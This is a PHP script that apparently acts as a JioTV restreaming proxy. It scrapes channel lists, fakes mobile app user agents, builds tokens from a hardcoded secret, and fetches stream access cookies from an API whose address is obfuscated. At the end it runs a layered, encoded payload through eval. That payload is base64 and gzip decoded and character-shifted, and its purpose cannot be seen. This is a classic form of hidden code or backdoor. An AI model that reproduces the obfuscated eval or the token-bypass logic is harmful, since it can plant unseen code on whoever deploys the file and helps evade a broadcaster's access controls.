<?php

error_reporting(0);

$WORLDWIDE_PROXY = "OFF";    //  "ON" or "OFF"

//============================================================================//

if(!is_dir("AppData")){ mkdir("AppData"); }
if(!file_exists("AppData/.htaccess")){ @file_put_contents("AppData/.htaccess", "deny from all"); }

function response($status, $code, $message, $data)
{
    header("Access-Control-Allow-Origin: *");
    header("Content-Type: application/json");
    if($status == "success" || $status == "error")
    {
        if($status == "error"){ $data = ""; }
        $response = array("status" => $status, "code" => $code, "message" => $message, "data" => $data);
        exit(json_encode($response));
    }
    else
    {
        http_response_code(500);
        exit("Fatal Server Error Occured");
    }
}

function hidestreamz($action, $data)
{
    $ky = "aes-128-cbc-8032";
    if($action == "encrypt")
    {
        $encrypted_data = openssl_encrypt($data, 'aes-128-cbc', $ky, OPENSSL_RAW_DATA, $ky);
		$edata = bin2hex($encrypted_data);
        return $edata;
    }
    else
    {
        $decrypted_data = openssl_decrypt(hex2bin($data), 'aes-128-cbc', $ky, OPENSSL_RAW_DATA, $ky);
    	return $decrypted_data;
    }
}

function getslugbyIDJio($id)
{
    $slug = ""; $tvsuns = jtv_channels();
    if(isset($tvsuns[0])){ foreach($tvsuns as $tvs) { if($id == $tvs['id']){ $slug = $tvs['slug']; } } }
    return $slug;
}

function jio_stream_link($id)
{
    $playurl = "";
    $token = jio_livetoken($id);
    $slug = getslugbyIDJio($id);
    $aPath = getJTVPathbyAPI($id);
    if(!empty($aPath))
    {
        if(strpos($aPath, "bpk-tv") !== false || strpos($aPath, "packagerx_") !== false) {
            $playurl = "https://jiotvmblive.cdn.jio.com".$aPath."?".$token;
        }
    }
    else
    {
        $type1 = "https://jiotvmblive.cdn.jio.com/bpk-tv/".$slug."_MOB/Fallback/index.m3u8"."?".$token;
        $type2 = "https://jiotvmblive.cdn.jio.com/packagerx_mpd3/".$slug."_HLS/".$slug.".m3u8"."?".$token;
        $type3 = "https://jiotvmblive.cdn.jio.com/packagerx_mpd2/".$slug."_HLS/".$slug.".m3u8"."?".$token;
        $ezmoS = jiocheckstream($type1);
        if(empty($ezmoS['data'])) { $ezmoS = jiocheckstream($type2);
            if(empty($ezmoS['data'])) { $ezmoS = jiocheckstream($type3);
            }
        }
    }
    if(isset($ezmoS['url']) && !empty($ezmoS['url'])) { $playurl = $ezmoS['url']; }
    return $playurl;
}

function jiocheckstream($link)
{
    $finalurl = "";
    $process = curl_init($link); 
    curl_setopt($process, CURLOPT_HTTPHEADER, array("User-Agent: plaYtv/7.0.8 (Linux;Android 9) ExoPlayerLib/2.11.7")); 
    curl_setopt($process, CURLOPT_HEADER, 1);
    curl_setopt($process, CURLOPT_ENCODING, '');
    curl_setopt($process, CURLOPT_TIMEOUT, 10); 
    curl_setopt($process, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($process, CURLOPT_FOLLOWLOCATION, 1); 
    $return = curl_exec($process);
    $pgnfo = curl_getinfo($process);
    $finalurl = curl_getinfo($process, CURLINFO_EFFECTIVE_URL);
    curl_close($process);
    if(stripos($return, "#EXTM3U") === false){ $return = ""; $finalurl = ""; }
    return array("http_code" => $pgnfo['http_code'], "data" => $return, "url" => $finalurl);
}

function jtvbase($url)
{
    if(stripos($url, "?") !== false)
    {
        $ci = explode("?", $url);
        if(isset($ci[0]) && !empty($ci[0]))
        {
            $url = trim($ci[0]);
        }
    }
    $base = str_replace(basename($url), "", $url);
    return $base;
}

function ex_jio_pxe($token)
{
    $exp_value = "";
    $parts = explode('exp=', $token);
    if(isset($parts[1]) && !empty($parts[1]))
    {
        if(stripos($parts[1], "~") !== false)
        {
            $darts = explode("~", $parts[1]);
            if(isset($darts[0]) && !empty($darts[0]))
            {
                $exp_value = trim($darts[0]);
            }
        }
        else
        {
            $exp_value = trim($parts[1]);
        }
    }
    return $exp_value;
}

function jiooldtoken()
{
    return "jct=" . trim(str_replace("\n","",str_replace("\r","",str_replace("/","_",str_replace("+","-",str_replace("=","",base64_encode(md5("cutibeau2ic01b589574d7399b27f0e681450bc51f1" . (time() + 1200),true)))))))) . "&pxe=" . (time() + 1200) . "&st=01b589574d7399b27f0e681450bc51f1";
}

function jtv_channels()
{
    $livetv = array();
    $livecachepath = "AppData/JTVChannels";
    if(file_exists($livecachepath))
    {
        $rltvcache = @file_get_contents($livecachepath);
        if(!empty($rltvcache))
        {
            $pltvdata = @json_decode($rltvcache, true);
            if(isset($pltvdata[0]))
            {
                $livetv = $pltvdata;
            }
        }
    }

    if(empty($livetv))
    {
        $jiotv_lang_mapping = array("1" => "Hindi", "2" => "Marathi", "3" => "Punjabi", "4" => "Urdu", "5" => "Bengali", "6" => "English", "7" => "Malayalam", "8" => "Tamil", "9" => "Gujarati", "10" => "Odia", "11" => "Telugu", "12" => "Bhojpuri", "13" => "Kannada", "14" => "Assamese", "15" => "Nepali", "16" => "French", "17" => "", "18" => "", "19" => "");
        $api = "https://jiotv.jio.ril.com/apis/v1.3/getMobileChannelList/get/?os=android&devicetype=phone";
        $process = curl_init($api); 
        curl_setopt($process, CURLOPT_HTTPHEADER, array("User-Agent: okhttp/4.9.0")); 
        curl_setopt($process, CURLOPT_HEADER, 0);
        curl_setopt($process, CURLOPT_ENCODING, '');
        curl_setopt($process, CURLOPT_TIMEOUT, 10); 
        curl_setopt($process, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($process, CURLOPT_FOLLOWLOCATION, 1); 
        $return = curl_exec($process); 
        curl_close($process);
        $idata = @json_decode($return, true);
        if(isset($idata['result'][1]['channel_id']))
        {
            foreach($idata['result'] as $tvme)
            {
                $livetv[] = array("id" => $tvme['channel_id'],
                                "slug" => str_replace(".png", "", $tvme['logoUrl']),
                                "title" => $tvme['channel_name'],
                                "lang" => $jiotv_lang_mapping[$tvme['channelLanguageId']],
                                "logo" => "https://jiotvimages.cdn.jio.com/dare_images/images/".$tvme['logoUrl']);
            }
        }
        if(isset($livetv[0]))
        {
            @file_put_contents($livecachepath, json_encode($livetv));
        }
    }
    return $livetv;
}

function jio_livetoken($id)
{
    $saveJioCookiesHere = "AppData/JioMBToken";
    $m3u8link = ""; $jioCToken = "";
    if(file_exists($saveJioCookiesHere)) {
        $VnJTokenTime = ""; $VnJTokenFull ="";
        $readJioCookiesHere = @file_get_contents($saveJioCookiesHere);
        if(stripos($readJioCookiesHere, "|||") !== false)
        {
            $xplitCookieHere = explode("|||", $readJioCookiesHere);
            if(isset($xplitCookieHere[0]) && !empty($xplitCookieHere[0])) { $VnJTokenTime = trim($xplitCookieHere[0]); }
            if(isset($xplitCookieHere[1]) && !empty($xplitCookieHere[1])) { $VnJTokenFull = trim($xplitCookieHere[1]); }
        }
        if(!empty($VnJTokenTime) && !empty($VnJTokenFull)) { if(time() < $VnJTokenTime) { $jioCToken = $VnJTokenFull; } }
    }
    if(empty($jioCToken))
    {
        $apiurl = convert_uudecode(base64_decode("TTonMVQ8JyxaK1JdVD1CWU05NjFJODJZSjo2XE44Vl1NK1YlUDo3LE89QyhOLCJdRzk3MUM6JiVOO0Y1TAoxPTcpTCtWPUU9Ji1IODZZTjk2UVU8RlBgCmAK"));
        $apipost = json_encode(array('channel_id' => $id));
        $apiheaders = array("Content-Type: application/json");
        $process = curl_init($apiurl); 
        curl_setopt($process, CURLOPT_POST, 1);
        curl_setopt($process, CURLOPT_POSTFIELDS, $apipost);
        curl_setopt($process, CURLOPT_HTTPHEADER, $apiheaders); 
        curl_setopt($process, CURLOPT_HEADER, 0);
        curl_setopt($process, CURLOPT_TIMEOUT, 10); 
        curl_setopt($process, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($process, CURLOPT_FOLLOWLOCATION, 1);  
        $return = curl_exec($process); 
        curl_close($process);
        $odata = @json_decode($return, true);
        if(isset($odata['bitrates']['auto']) && !empty($odata['bitrates']['auto'])){ $m3u8link = $odata['bitrates']['auto']; }
        if(!empty($m3u8link))
        {
            $process = curl_init($m3u8link);
            curl_setopt($process, CURLOPT_HTTPHEADER, array("User-Agent: plaYtv/7.0.8 (Linux;Android 9) ExoPlayerLib/2.11.7")); 
            curl_setopt($process, CURLOPT_HEADER, 1);
            curl_setopt($process, CURLOPT_TIMEOUT, 10); 
            curl_setopt($process, CURLOPT_RETURNTRANSFER, 1); 
            curl_setopt($process, CURLOPT_FOLLOWLOCATION, 1);  
            $result = curl_exec($process); 
            curl_close($process);
            preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
            $cookies = array();
            foreach($matches[1] as $item)
            {
                parse_str($item, $cookie);
                $cookies = array_merge($cookies, $cookie);
                if(isset($cookies['__hdnea__']) && !empty($cookies['__hdnea__']))
                {
                    $jioCToken = "__hdnea__=".$cookies['__hdnea__'];
                    $jioCToken_Time = ex_jio_pxe($jioCToken);
                    if(file_put_contents($saveJioCookiesHere, $jioCToken_Time."|||".$jioCToken)){}
                }
            }    
        }
        if(empty($jioCToken) && stripos($m3u8link, "__hdnea__") !== false)
        {
            $ldn = explode("__hdnea__", $m3u8link);
            if(isset($ldn[1]) && !empty($ldn[1])) {
                $jioCToken = "__hdnea__".trim($ldn[1]); $jioCToken_Time = ex_jio_pxe($jioCToken);
                if(file_put_contents($saveJioCookiesHere, $jioCToken_Time."|||".$jioCToken)){}
            }
        }
    }
    return $jioCToken;
}

function getJTVPathbyAPI($id)
{
    $m3u8link = ""; $output = "";
    $chkSavedPath = save_channel_slug_part("read", $id, "");
    if(!empty($chkSavedPath))
    {
        $output = $chkSavedPath;
    }
    else
    {
        $apiurl = convert_uudecode(base64_decode("TTonMVQ8JyxaK1JdVD1CWU05NjFJODJZSjo2XE44Vl1NK1YlUDo3LE89QyhOLCJdRzk3MUM6JiVOO0Y1TAoxPTcpTCtWPUU9Ji1IODZZTjk2UVU8RlBgCmAK"));
        $apipost = json_encode(array('channel_id' => $id));
        $apiheaders = array("Content-Type: application/json");
        $process = curl_init($apiurl); 
        curl_setopt($process, CURLOPT_POST, 1);
        curl_setopt($process, CURLOPT_POSTFIELDS, $apipost);
        curl_setopt($process, CURLOPT_HTTPHEADER, $apiheaders); 
        curl_setopt($process, CURLOPT_HEADER, 0);
        curl_setopt($process, CURLOPT_TIMEOUT, 5); 
        curl_setopt($process, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($process, CURLOPT_FOLLOWLOCATION, 1);  
        $return = curl_exec($process); 
        curl_close($process);
        $odata = @json_decode($return, true);
        if(isset($odata['bitrates']['auto']) && !empty($odata['bitrates']['auto'])) {
            $m3u8link = $odata['bitrates']['auto'];
        }
        if(!empty($m3u8link)) {
            $prsM3u = parse_url($m3u8link);
            if(isset($prsM3u['path']) && !empty($prsM3u['path'])) {
                $output = $prsM3u['path'];
                save_channel_slug_part("save", $id, $output);
            }
        }
    }
    return $output;
}

function save_channel_slug_part($action, $id, $link)
{
    $output = ""; $alread = array();
    $izpuv = "AppData/JTVChannelPaths";
    if(file_exists($izpuv)) {
        $alread = @json_decode(@file_get_contents($izpuv), true);
        if(empty($alread)){ $alread = array(); }
    }
    foreach($alread as $mldi) {
        if($id == $mldi['id']) { $output = $mldi['link']; }
    }
    if($action == "save") {
        if(empty($output)) {
            $alread[] = array("id" => $id, "link" => $link);
            @file_put_contents($izpuv, json_encode($alread));
        }
        $output = "";
    }
    return $output;
}

eval(base64_decode('ZnVuY3Rpb24gS3lhaEhIKCRwa2FqQykKeyAKJHBrYWpDPWd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRwa2FqQykpOwogZm9yKCRpPTA7JGk8c3RybGVuKCRwa2FqQyk7JGkrKykKIHsKJHBrYWpDWyRpXSA9IGNocihvcmQoJHBrYWpDWyRpXSktMSk7CiB9CiByZXR1cm4gJHBrYWpDOwogfWV2YWwoS3lhaEhIKCJYVkJCYXNNd0VIeEFYN0dJSHB5YjE1SldDU0ZOTC9sQUNyMVV4VGkySEF3aE9jUUVRZW5iT3l2blZNR3dFdHFablZraW5CZWFScXBlMjQvRDhmTncvREtSdVk3Y3VKaTlBbmNiVUQxZ1kzWmFHMkNNWERNUUFBK09LTWQ4MDI1SEJtMG5BTi9NcUtOU3pZcCtLRDI2UzNYcTdrbGNPNlQrTnFUcWZad3VxVDJudWUxdjF6bGQ1L3UvQnFpSnFxeVh3YmJHMnhhVDJRMTRDMm9mYzlqZ3ZvNGNNTlU5elR1WUFvZlZTWU1RZ244UExiK0owcFQyYkYzeG5rTlhjcWdNTzhqWE5ncGlDZUpaWllTaXlxcUs2Y3MwdEF0eWVsRFZGVlJaTUJFcjRySXV5QXFjaVhLV2ZsSHovcmxoTml1Y0xRMVQydEl2N2QvK0FBPT0iKSk7'));
?>